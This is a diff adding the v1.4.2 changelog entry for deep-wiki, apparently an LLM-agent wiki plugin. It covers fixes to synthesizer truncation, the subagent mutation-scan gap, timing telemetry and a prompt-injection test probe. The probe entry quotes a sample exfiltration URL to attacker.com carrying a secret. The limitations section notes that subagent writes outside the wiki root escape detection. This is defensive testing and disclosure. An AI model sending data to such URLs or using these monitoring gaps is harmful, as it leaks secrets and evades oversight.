@@ -2,6 +2,128 @@
 
 All notable changes to deep-wiki are documented here.
 
+## [1.4.2] — 2026-05-07
+
+Patch release closing four v1.4.1 backlog items captured in
+`docs/handoff-2026-05-06-v1.4.2.md`. Two are field-issue fixes uncovered
+by v1.4.1 cache-active dogfood (F1, F2 deferred from /deep-review round 1
+I1); two are deferred quality items (B3 phase telemetry from v1.4.0
+plan §10.2; I2 V-2/V-3 probe full-URL match from /deep-review rounds 1+2).
+Single-source + multi-source ingest paths are spec-equivalent to v1.4.1
+(NOT byte-identical — F1 disk-authoritative read + F2 §3.9 4th invocation
+site change the runtime invariants). Wiki schema additive only
+(`phase_timing_ms` field in `ingest` log lines; `wiki-lint` Step 6
+LOG-INVARIANT scan unaffected).
+
+**Mandatory verbatim known-limitations language carried forward from
+v1.4.1 §11.5 (re-stated for transparency):**
+
+- **L1**: V-0 PASS via Mechanism B is best-effort — Claude Code runtime
+  does not expose dispatch metadata API. Track C v2 deferred to v1.5.0+
+  pending runtime API support. **v1.4.2 addendum:** I2 fix improves
+  V-2/V-3 probe fidelity (full-URL allowlist comparison), but the
+  empirical SECOND run against v1.4.1 final agent files remains deferred
+  (sandbox orchestration workstream); CHANGELOG retains "best-effort"
+  framing without empirical addendum until SECOND run completes.
+- **L2**: §3.9 dirty-scan covers `<wiki_root>/`-internal mutations only;
+  off-root writes (e.g. `/tmp/`) NOT detected. v1.4.0 dogfood failure
+  mode (workers writing `/tmp/v140-workers-out/*`) is NOT covered by
+  §3.9. v1.4.1 was layered defense-in-depth; v1.4.2 F2 extends bracketing
+  to the Stage 1 dispatch (single-source) but does NOT widen the
+  off-root scope. Process-level sandboxing remains v1.5.0+ scope.
+
+### Bug fixes
+
+- **F1 (HIGH) — synthesizer `existing_page_body` truncation false-positive
+  C3 abort.** v1.4.1 cache-active dogfood (post-`/reload-plugins`)
+  observed Stage 1 LLM emitting dramatically-truncated `existing_page_body`
+  for update entries (12377 bytes disk → 725 bytes emit; 20071 bytes disk
+  → 587 bytes emit). Main computed C3 hash baseline from truncated bytes,
+  so Step 7.6.C C3 check always reported "concurrent ingest detected"
+  against actual disk bytes — every update aborted. Pre-v1.4.2 contract
+  trusted synthesizer's emit; v1.4.2 contract has main re-read pages from
+  DISK after Stage 1 returns and use disk bytes as the C3 hash baseline
+  (and as Stage 2 worker / inline-write synthesis context). Subsumes the
+  prior P6 round-1 hash-from-emit compute pass — no separate compute
+  needed because main reads disk directly. `agents/wiki-synthesizer-analysis.md`
+  Rule 4 strengthened to require FULL VERBATIM bytes (defensive contract;
+  if synthesizer emits short, main authoritatively recovers from disk).
+  Single-source path only — multi-source A4 (workers, not analysis-mode)
+  has no `existing_body_hash` field on entries.
+
+- **F2 (MEDIUM) — single-source Stage 1 dispatch §3.9 bracketing gap.**
+  v1.4.1 §3.9 worker-mutation dirty-scan brackets fire at 3 dispatch
+  sites (Step 7.5.M-A multi-source A4 fanout, Step 7.5.M-B Case B2
+  collision second-pass, Step 7.6.B-post single-source A5 fanout) but
+  did NOT bracket the single-source Stage 1 analysis dispatch
+  (`invoke deep-wiki:wiki-synthesizer-analysis` in Step 7.5). A
+  misresolved or downgraded analysis subagent could mutate `<wiki_root>/`
+  during Stage 1 LLM execution, undetected. v1.4.2 adds a 4th invocation
+  site (label `"A5-analysis"`) immediately bracketing the Stage 1
+  dispatch. Pre-snapshot fires before the dispatch; post-scan after
+  Stage 1 returns and BEFORE the page_plan branch decision (sub-threshold
+  inline vs. A5 fanout downstream branching is irrelevant — Stage 1
+  mutation is caught regardless). `WIKI_TEST_MODE=1` env-gated;
+  production cost unchanged.
+
+### Telemetry
+
+- **B3 — `phase_timing_ms` in `log.jsonl` `ingest` lines.** Deferred from
+  v1.4.0 plan §10.2; v1.4.0 dogfood measured ~17 minutes wall-clock with
+  anecdotal Stage 1 ~7 min + Stage 2 ~10 min splits but no per-phase timing
+  was recorded, so the breakdown was unverifiable post-hoc. v1.4.2 adds
+  a `_ts_ms` helper (Bash 3.2 portable; python3 preferred for ms precision,
+  `date +%s000` fallback for second precision) and threads timestamp
+  captures through Step 1 entry / Step 7.5 single-source / Step 7.5.M-A
+  multi-source / Step 7.6.A A5 fanout / Step 7.6.B-post / Step 7.6.C
+  Stage 3 lock acquire / Step 7.5.M-C multi-source atomic-write entry /
+  Step 10 log emit. Ingest line emits new field
+  `phase_timing_ms: {stage_1_analysis, stage_2_fanout, stage_3_write,
+  total}` (all ms integers). **Schema-additive** — `wiki-lint` Step 6
+  LOG-INVARIANT scan filters via
+  `select(.action != "ingest-repair") | .pages_created[]?` and ignores
+  unknown top-level fields. Field omitted from non-`ingest` lifecycle
+  actions (ingest-skip, ingest-repair, ingest-fail, lint, rebuild,
+  delete, query-filed, setup). Production cost: ~12 ms total per ingest
+  (~6 `_ts_ms` calls dominated by Python startup; warm-cache ~2 ms each),
+  negligible vs. minutes-scale LLM phases.
+
+### Testing infrastructure (probe quality)
+
+- **I2 — V-2/V-3 WebFetch probe full-URL allowlist comparison.** From
+  /deep-review rounds 1 + 2 (Codex review, single-reviewer raised twice).
+  `scripts/v0-probe/v2-v3-record.sh` previously recorded WebFetch
+  probes with only the request PATH (column 3 of stub log) and compared
+  against the path component of allowlist URLs. False-pass surface:
+  injected `https://attacker.com/v2-probe-feed?data=<exfiltrated_secret>`
+  matched allowed `https://example.com/v2-probe-feed` on the path-only
+  comparison. v1.4.2 adds a 6th TSV column to
+  `scripts/v0-probe/webfetch-stub-server.py` (`<host>` from request Host
+  header), and `v2-v3-record.sh` now extracts full URLs as
+  `<host><path>?<query>` (scheme stripped) for normalized comparison
+  against allowlist URLs. Backward-compatible: pre-v1.4.2 5-column logs
+  trigger lossy-mode detection and degrade to path-only comparison with
+  `lossy-pre-v1.4.2-log: ...` annotation in the notes column. Testing
+  infrastructure only — production agent behavior unaffected.
+
+### Migration
+
+No external API changes from v1.4.1. Internal contract change is the
+F1 disk-authoritative read for `existing_body_hash`: spec-compliant
+agents (whose `existing_page_body` matches disk within EOL tolerance) see
+byte-identical Stage 3 hashing semantics. Non-compliant emits trigger a
+`WARN: synthesizer existing_page_body drift for ...` stderr line and
+recover transparently from disk.
+
+### Acknowledgements
+
+- Handoff doc `docs/handoff-2026-05-06-v1.4.2.md` (gitignored author
+  artifact) drove the F1+F2+B3+I2 backlog ordering.
+- /deep-review rounds 1+2 from v1.4.1 cycle (Opus + Codex review +
+  Codex adversarial) flagged F2 (round 1 I1) and I2 (rounds 1+2,
+  single-reviewer Codex twice).
+- v1.4.1 cache-active dogfood (handoff §0) discovered F1 in the wild.
+
 ## [1.4.1] — 2026-05-06
 
 Trust-boundary closure (best-effort, layered defense). Splits the unified
